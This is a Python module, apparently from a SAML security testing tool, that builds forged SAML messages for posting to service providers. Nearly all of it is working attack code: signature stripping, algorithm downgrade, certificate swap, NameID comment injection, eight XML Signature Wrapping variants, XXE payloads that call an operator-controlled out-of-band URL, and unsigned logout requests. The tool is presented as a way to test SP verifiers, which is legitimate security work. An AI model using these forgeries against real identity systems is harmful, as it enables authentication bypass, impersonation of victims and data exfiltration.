"""Malicious SAML Response / Assertion manipulation.

Operates on an existing signed Response (or a minimal unsigned template) and
emits variants meant to test how forgiving an SP verifier is. Everything
here is something a well-behaved SP should reject; `signxml` refuses to
produce several of these patterns, which is why we build them ourselves.

Each function returns bytes of serialized XML suitable for posting to an SP's
ACS endpoint.

Attacks implemented:
  - strip_signature       : remove every ds:Signature element (classic
                             "verify only if signature present")
  - downgrade_sig_alg     : rewrite SignatureMethod to rsa-sha1. The signed
                             bytes won't verify anymore; this tests whether
                             the SP rejects on alg, on digest, or on the
                             signature value itself (ordering matters).
  - swap_key_info         : replace <KeyInfo><X509Certificate> bytes with a
                             supplied attacker cert. Some SP libs trust
                             embedded KeyInfo over metadata-pinned certs.
  - inject_nameid_comment : insert a comment inside NameID text so the
                             verifier's canonicalizer sees one value but the
                             business logic sees another (CVE-2018-0489 family).
  - xsw1                  : XML Signature Wrapping variant 1 -- clone a
                             signed Assertion into the root's Extensions-like
                             position and put an attacker Assertion where
                             business logic reads.
"""

from __future__ import annotations

from copy import deepcopy
from typing import Any

from lxml import etree

SAMLP_NS = "urn:oasis:names:tc:SAML:2.0:protocol"
SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion"
DS_NS = "http://www.w3.org/2000/09/xmldsig#"
NSMAP = {"samlp": SAMLP_NS, "saml": SAML_NS, "ds": DS_NS}


class SAMLForgeError(RuntimeError):
    pass


def _parse(xml: bytes) -> "etree._Element":
    try:
        return etree.fromstring(xml)
    except etree.XMLSyntaxError as e:
        raise SAMLForgeError(f"input is not well-formed XML: {e}") from e


def _ser(root: "etree._Element") -> bytes:
    return etree.tostring(root, xml_declaration=False, encoding="utf-8")


# ---------- signature stripping ----------


def strip_signature(xml: bytes) -> bytes:
    """Remove every ds:Signature element from the document."""
    root = _parse(xml)
    sigs = root.xpath(".//ds:Signature", namespaces=NSMAP)
    for s in sigs:
        s.getparent().remove(s)
    return _ser(root)


# ---------- signature algorithm downgrade ----------


_ALG_SHA1 = "http://www.w3.org/2000/09/xmldsig#rsa-sha1"
_DIGEST_SHA1 = "http://www.w3.org/2000/09/xmldsig#sha1"


def downgrade_sig_alg(
    xml: bytes,
    *,
    sig_alg: str = _ALG_SHA1,
    digest_alg: str = _DIGEST_SHA1,
) -> bytes:
    """Rewrite SignatureMethod / DigestMethod to weak algs.

    The signature value itself will no longer verify (contents changed). This
    is still useful: a well-behaved SP rejects at the algorithm check before
    ever looking at the signature bytes, so a `not_trusted_alg` error here is
    the expected outcome. SPs that instead surface `signature mismatch` are
    probably willing to verify with weak algs when signatures *do* match.
    """
    root = _parse(xml)
    for sm in root.xpath(".//ds:SignatureMethod", namespaces=NSMAP):
        sm.set("Algorithm", sig_alg)
    for dm in root.xpath(".//ds:DigestMethod", namespaces=NSMAP):
        dm.set("Algorithm", digest_alg)
    return _ser(root)


# ---------- KeyInfo swap ----------


def swap_key_info(xml: bytes, attacker_cert_b64: str) -> bytes:
    """Replace <X509Certificate> bytes inside every KeyInfo with attacker cert.

    attacker_cert_b64 is the base64-encoded DER of the attacker's cert (the
    same format that appears inside ds:X509Certificate)."""
    root = _parse(xml)
    found = False
    for cert in root.xpath(".//ds:KeyInfo//ds:X509Certificate", namespaces=NSMAP):
        cert.text = attacker_cert_b64
        found = True
    if not found:
        raise SAMLForgeError("no ds:KeyInfo//ds:X509Certificate to swap")
    return _ser(root)


# ---------- NameID comment injection ----------


def inject_nameid_comment(xml: bytes, victim: str, suffix: str = ".attacker.test") -> bytes:
    """Replace the first NameID text with 'victim<!---->suffix'.

    Verifiers canonicalize text nodes and feed them into the signature,
    which operates on concatenated siblings; buggy business-logic reads
    that then call getText()/textContent may stop at the first comment,
    yielding just the victim portion. CVE-2018-0489 family.
    """
    root = _parse(xml)
    nameid = root.find(".//{urn:oasis:names:tc:SAML:2.0:assertion}NameID")
    if nameid is None:
        raise SAMLForgeError("no saml:NameID found")
    # Build: <NameID>victim<!---->suffix</NameID>
    nameid.text = victim
    comment = etree.Comment("")
    comment.tail = suffix
    nameid.append(comment)
    return _ser(root)


# ---------- XSW1 -- XML Signature Wrapping variant 1 ----------


def xsw1(xml: bytes, evil_subject_name_id: str) -> bytes:
    """XSW1: clone the original signed Assertion into Extensions-like
    container; place an attacker-controlled Assertion (with a different
    NameID) in the position the SP business logic reads.

    Both copies are present, so:
      - the verifier finds the signed Assertion (clone) and validates.
      - the SP reads the first Assertion child of Response (the evil one).

    Only works against verifiers that re-scan by tag name instead of by
    the Reference URI the signature actually points at.
    """
    root = _parse(xml)
    if root.tag != f"{{{SAMLP_NS}}}Response":
        raise SAMLForgeError("XSW1 requires a samlp:Response root")
    signed = root.find(f"./{{{SAML_NS}}}Assertion")
    if signed is None:
        raise SAMLForgeError("no saml:Assertion to wrap")

    # Deep-clone the signed assertion so the signature stays intact inside.
    clone = deepcopy(signed)

    # Build evil assertion by cloning original structure + swapping NameID.
    evil = deepcopy(signed)
    # Remove signature from the evil copy -- the signed clone keeps the sig.
    for s in evil.xpath("./ds:Signature", namespaces=NSMAP):
        evil.remove(s)
    # Swap NameID text on the evil copy.
    ev_nameid = evil.find(f".//{{{SAML_NS}}}NameID")
    if ev_nameid is not None:
        # Clear children (e.g. the comment node) and set fresh text.
        for child in list(ev_nameid):
            ev_nameid.remove(child)
        ev_nameid.text = evil_subject_name_id
    # Wrap ID collision: keep same ID so business logic picks this one.
    # Change the signed clone's ID so the outer doc still has two Assertion
    # elements; many parsers tolerate duplicate IDs.

    # Place the signed clone inside a parasitic Extensions element so the
    # signature reference still resolves but the element is outside the
    # business-logic traversal.
    extensions = etree.SubElement(root, f"{{{SAMLP_NS}}}Extensions")
    extensions.append(clone)

    # Replace the original signed assertion with the evil one.
    root.remove(signed)
    # Insert the evil assertion *before* Extensions so it's the first
    # saml:Assertion child of the Response.
    root.insert(list(root).index(extensions), evil)
    return _ser(root)


# ---------- XSW2 through XSW8 ----------


def _clone_and_strip_sig(signed: "etree._Element") -> "etree._Element":
    """Return a deep clone of `signed` with its own top-level ds:Signature
    stripped so it can be mutated safely as the 'evil' half."""
    out = deepcopy(signed)
    for s in out.xpath("./ds:Signature", namespaces=NSMAP):
        out.remove(s)
    return out


def _set_nameid(assertion: "etree._Element", text: str) -> None:
    ni = assertion.find(f".//{{{SAML_NS}}}NameID")
    if ni is None:
        return
    for child in list(ni):
        ni.remove(child)
    ni.text = text


def _signed_assertion(root: "etree._Element") -> "etree._Element":
    a = root.find(f"./{{{SAML_NS}}}Assertion")
    if a is None:
        raise SAMLForgeError("no saml:Assertion in Response")
    return a


def xsw2(xml: bytes, evil_subject_name_id: str) -> bytes:
    """XSW2: signed Assertion detached and placed as a sibling under a
    parasitic Object element next to the evil Assertion. The evil one keeps
    the original ID; the signed clone keeps its own ID."""
    root = _parse(xml)
    if root.tag != f"{{{SAMLP_NS}}}Response":
        raise SAMLForgeError("XSW2 requires samlp:Response root")
    signed = _signed_assertion(root)
    evil = _clone_and_strip_sig(signed)
    _set_nameid(evil, evil_subject_name_id)

    # Build a parasitic container element (Object from XML-dsig namespace)
    # that holds the signed clone. SPs that iterate child::saml:Assertion
    # pick the evil one; signature verifiers that chase Reference URI find
    # the signed clone inside Object.
    obj = etree.Element(f"{{{DS_NS}}}Object")
    obj.append(deepcopy(signed))

    parent = signed.getparent()
    idx = list(parent).index(signed)
    parent.remove(signed)
    parent.insert(idx, evil)
    parent.insert(idx + 1, obj)
    return _ser(root)


def xsw3(xml: bytes, evil_subject_name_id: str) -> bytes:
    """XSW3: evil Assertion as the first child of Response; signed Assertion
    preserved in its original position afterwards. SPs that call
    firstChildElementOfType(Response, Assertion) pick evil; signature walk
    finds the intact signed element after."""
    root = _parse(xml)
    if root.tag != f"{{{SAMLP_NS}}}Response":
        raise SAMLForgeError("XSW3 requires samlp:Response root")
    signed = _signed_assertion(root)
    evil = _clone_and_strip_sig(signed)
    _set_nameid(evil, evil_subject_name_id)
    root.insert(0, evil)
    return _ser(root)


def xsw4(xml: bytes, evil_subject_name_id: str) -> bytes:
    """XSW4: signed Assertion is wrapped *inside* the evil Assertion. SPs
    that read the outermost Assertion pick evil; verifiers that dig via
    Reference URI reach the nested signed original."""
    root = _parse(xml)
    signed = _signed_assertion(root)
    evil = _clone_and_strip_sig(signed)
    _set_nameid(evil, evil_subject_name_id)
    # Place the signed element as a child of the evil element.
    evil.append(deepcopy(signed))
    parent = signed.getparent()
    idx = list(parent).index(signed)
    parent.remove(signed)
    parent.insert(idx, evil)
    return _ser(root)


def xsw5(xml: bytes, evil_subject_name_id: str) -> bytes:
    """XSW5: ID swap. Signed Assertion gets a fresh ID; evil Assertion
    takes the signed one's original ID. SPs that match by ID alone trust
    the evil, but Reference URI verifies against the renamed signed
    clone."""
    root = _parse(xml)
    signed = _signed_assertion(root)
    original_id = signed.get("ID") or "_a-1"
    signed.set("ID", original_id + "-renamed")
    evil = _clone_and_strip_sig(signed)
    evil.set("ID", original_id)
    _set_nameid(evil, evil_subject_name_id)
    parent = signed.getparent()
    idx = list(parent).index(signed)
    parent.insert(idx, evil)  # before the renamed signed clone
    return _ser(root)


def xsw6(xml: bytes, evil_subject_name_id: str) -> bytes:
    """XSW6: signed Assertion nested inside evil's Signature/Object.
    Reference URI resolves into an XML-dsig Object that *itself* contains
    the signed original, so verifiers walk in; business logic sees the
    outer evil assertion."""
    root = _parse(xml)
    signed = _signed_assertion(root)
    evil = _clone_and_strip_sig(signed)
    _set_nameid(evil, evil_subject_name_id)

    # Build ds:Signature > ds:Object > signed-clone
    sig = etree.SubElement(evil, f"{{{DS_NS}}}Signature")
    obj = etree.SubElement(sig, f"{{{DS_NS}}}Object")
    obj.append(deepcopy(signed))

    parent = signed.getparent()
    idx = list(parent).index(signed)
    parent.remove(signed)
    parent.insert(idx, evil)
    return _ser(root)


def xsw7(xml: bytes, evil_subject_name_id: str) -> bytes:
    """XSW7: signed Assertion placed inside samlp:Extensions; evil Assertion
    in Response. Equivalent to XSW1 but with a different structural trick
    (the XSW1 clone is a duplicate; here the original gets relocated)."""
    root = _parse(xml)
    if root.tag != f"{{{SAMLP_NS}}}Response":
        raise SAMLForgeError("XSW7 requires samlp:Response root")
    signed = _signed_assertion(root)
    evil = _clone_and_strip_sig(signed)
    _set_nameid(evil, evil_subject_name_id)

    extensions = etree.SubElement(root, f"{{{SAMLP_NS}}}Extensions")
    extensions.append(deepcopy(signed))

    parent = signed.getparent()
    idx = list(parent).index(signed)
    parent.remove(signed)
    parent.insert(idx, evil)
    return _ser(root)


def xsw8(xml: bytes, evil_subject_name_id: str) -> bytes:
    """XSW8: XSW6 variant; signed Assertion inside a ds:Object that is
    directly a child of Response (not under Signature)."""
    root = _parse(xml)
    signed = _signed_assertion(root)
    evil = _clone_and_strip_sig(signed)
    _set_nameid(evil, evil_subject_name_id)

    obj = etree.SubElement(root, f"{{{DS_NS}}}Object")
    obj.append(deepcopy(signed))

    parent = signed.getparent()
    idx = list(parent).index(signed)
    parent.remove(signed)
    parent.insert(idx, evil)
    return _ser(root)


XSW_VARIANTS: dict[str, Any] = {
    "xsw1": xsw1,
    "xsw2": xsw2,
    "xsw3": xsw3,
    "xsw4": xsw4,
    "xsw5": xsw5,
    "xsw6": xsw6,
    "xsw7": xsw7,
    "xsw8": xsw8,
}


# ---------- NameID attribute-value comment injection ----------


def inject_nameid_attribute_comment(xml: bytes, victim: str) -> bytes:
    """Some SPs read NameID via an attribute path (SPNameQualifier, etc.)
    rather than element text. This variant injects a comment into the
    first text-bearing attribute of the NameID so attribute-normalization
    behaves differently from business logic reads."""
    root = _parse(xml)
    nameid = root.find(f".//{{{SAML_NS}}}NameID")
    if nameid is None:
        raise SAMLForgeError("no saml:NameID found")
    # Set Format so attribute-based parsers have something to latch onto.
    nameid.set("Format", "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress")
    nameid.text = victim
    comment = etree.Comment("")
    comment.tail = ".attacker.test"
    nameid.append(comment)
    return _ser(root)


# ---------- XXE payload builders ----------
#
# These produce XML bodies that trigger XML-external-entity behavior in
# vulnerable parsers. The check / CLI hands them to the operator, who sends
# them to their IdP's SSO endpoint out of band. Keep payloads bounded --
# we NEVER ship a billion-laughs exponential bomb; a modest quadratic
# expansion is enough to reveal whether the parser expands entities.


_XXE_BASE_AUTHN_REQUEST = """<?xml version="1.0"?>
<samlp:AuthnRequest
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_xxe-probe" Version="2.0" IssueInstant="2025-01-01T00:00:00Z"
    AssertionConsumerServiceURL="{acs_url}"
    Destination="{destination}">
  <saml:Issuer>{issuer}</saml:Issuer>
  <samlp:NameIDPolicy Format="&probe;" AllowCreate="true"/>
</samlp:AuthnRequest>"""


def xxe_external_entity(
    *,
    oob_url: str,
    issuer: str,
    acs_url: str,
    destination: str,
) -> bytes:
    """AuthnRequest whose DOCTYPE defines an external entity pointing at
    an operator-controlled OOB URL (e.g. the oauthive malicious RP's /cb).
    If the IdP fetches that URL, XXE is live.

    The entity is used inside NameIDPolicy/@Format so the attack reveals
    itself even if the IdP only partially parses the request before
    rejecting."""
    doctype = f'<!DOCTYPE samlp:AuthnRequest [<!ENTITY probe SYSTEM "{oob_url}">]>'
    body = _XXE_BASE_AUTHN_REQUEST.format(
        issuer=issuer, acs_url=acs_url, destination=destination
    )
    # Insert DOCTYPE right after the XML declaration.
    return body.replace(
        '<?xml version="1.0"?>',
        f'<?xml version="1.0"?>\n{doctype}',
    ).encode()


def xxe_parameter_entity(
    *,
    oob_url: str,
    issuer: str,
    acs_url: str,
    destination: str,
) -> bytes:
    """AuthnRequest that uses a parameter-entity chain to fetch a DTD from
    an OOB URL and then pull data back. Reveals parsers that resolve
    external parameter entities even when they refuse external general
    entities."""
    doctype = (
        f'<!DOCTYPE samlp:AuthnRequest [\n'
        f'  <!ENTITY % remote SYSTEM "{oob_url}">\n'
        f'  %remote;\n'
        f']>'
    )
    body = _XXE_BASE_AUTHN_REQUEST.format(
        issuer=issuer, acs_url=acs_url, destination=destination
    )
    body = body.replace("&probe;", "placeholder")
    return body.replace(
        '<?xml version="1.0"?>',
        f'<?xml version="1.0"?>\n{doctype}',
    ).encode()


def xxe_bounded_expansion(
    *, issuer: str, acs_url: str, destination: str, depth: int = 4
) -> bytes:
    """Internal-entity quadratic expansion. `depth` is clamped to [2, 5] --
    higher values can cause genuine DoS against a vulnerable target, which
    is out of scope for oauthive. Defaults are safe to test production-like
    dev tenants."""
    depth = max(2, min(5, depth))
    entities = []
    entities.append('<!ENTITY lol0 "lol">')
    for i in range(1, depth + 1):
        body = "&lol{};".format(i - 1) * 10  # quadratic (depth*10), bounded
        entities.append(f'<!ENTITY lol{i} "{body}">')
    use = f"&lol{depth};"
    doctype = (
        "<!DOCTYPE samlp:AuthnRequest [\n" + "\n".join(entities) + "\n]>"
    )
    body = _XXE_BASE_AUTHN_REQUEST.format(
        issuer=issuer, acs_url=acs_url, destination=destination
    )
    body = body.replace("&probe;", use)
    return body.replace(
        '<?xml version="1.0"?>',
        f'<?xml version="1.0"?>\n{doctype}',
    ).encode()


# ---------- LogoutRequest builder ----------


def build_logout_request(
    *,
    issuer: str,
    destination: str,
    name_id: str,
    session_index: str | None = None,
    nameid_format: str = "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress",
    request_id: str = "_logout-probe",
    issue_instant: str = "2025-01-01T00:00:00Z",
) -> bytes:
    """Emit a bare (unsigned) samlp:LogoutRequest suitable for probing whether
    an IdP accepts unsigned logout requests. SP-initiated SLO.

    An IdP that accepts this from an arbitrary sender is broken: anyone can
    terminate any user's IdP session."""
    root = etree.Element(
        f"{{{SAMLP_NS}}}LogoutRequest",
        nsmap={"samlp": SAMLP_NS, "saml": SAML_NS},
        attrib={
            "ID": request_id,
            "Version": "2.0",
            "IssueInstant": issue_instant,
            "Destination": destination,
        },
    )
    etree.SubElement(root, f"{{{SAML_NS}}}Issuer").text = issuer
    nameid = etree.SubElement(root, f"{{{SAML_NS}}}NameID", attrib={"Format": nameid_format})
    nameid.text = name_id
    if session_index:
        etree.SubElement(root, f"{{{SAMLP_NS}}}SessionIndex").text = session_index
    return _ser(root)


# ---------- minimal template for operators with no real Response ----------


def minimal_response_template(
    *,
    issuer: str,
    audience: str,
    recipient: str,
    in_response_to: str,
    subject_name_id: str,
    not_on_or_after: str,
    not_before: str,
) -> bytes:
    """Build an unsigned samlp:Response the operator can feed into forge
    primitives. Useful when you want a known-shape starting point rather than
    a captured real Response."""
    root = etree.Element(
        f"{{{SAMLP_NS}}}Response",
        nsmap={"samlp": SAMLP_NS, "saml": SAML_NS, "ds": DS_NS},
        attrib={
            "ID": "_template-resp",
            "Version": "2.0",
            "IssueInstant": not_before,
            "InResponseTo": in_response_to,
            "Destination": recipient,
        },
    )
    etree.SubElement(root, f"{{{SAML_NS}}}Issuer").text = issuer
    status = etree.SubElement(root, f"{{{SAMLP_NS}}}Status")
    etree.SubElement(status, f"{{{SAMLP_NS}}}StatusCode").set(
        "Value", "urn:oasis:names:tc:SAML:2.0:status:Success"
    )
    assertion = etree.SubElement(
        root,
        f"{{{SAML_NS}}}Assertion",
        attrib={"ID": "_template-assertion", "Version": "2.0", "IssueInstant": not_before},
    )
    etree.SubElement(assertion, f"{{{SAML_NS}}}Issuer").text = issuer
    subject = etree.SubElement(assertion, f"{{{SAML_NS}}}Subject")
    etree.SubElement(subject, f"{{{SAML_NS}}}NameID").text = subject_name_id
    sc = etree.SubElement(subject, f"{{{SAML_NS}}}SubjectConfirmation")
    sc.set("Method", "urn:oasis:names:tc:SAML:2.0:cm:bearer")
    scd = etree.SubElement(sc, f"{{{SAML_NS}}}SubjectConfirmationData")
    scd.set("InResponseTo", in_response_to)
    scd.set("Recipient", recipient)
    scd.set("NotOnOrAfter", not_on_or_after)
    conditions = etree.SubElement(
        assertion, f"{{{SAML_NS}}}Conditions",
        attrib={"NotBefore": not_before, "NotOnOrAfter": not_on_or_after},
    )
    ar = etree.SubElement(conditions, f"{{{SAML_NS}}}AudienceRestriction")
    etree.SubElement(ar, f"{{{SAML_NS}}}Audience").text = audience
    return _ser(root)
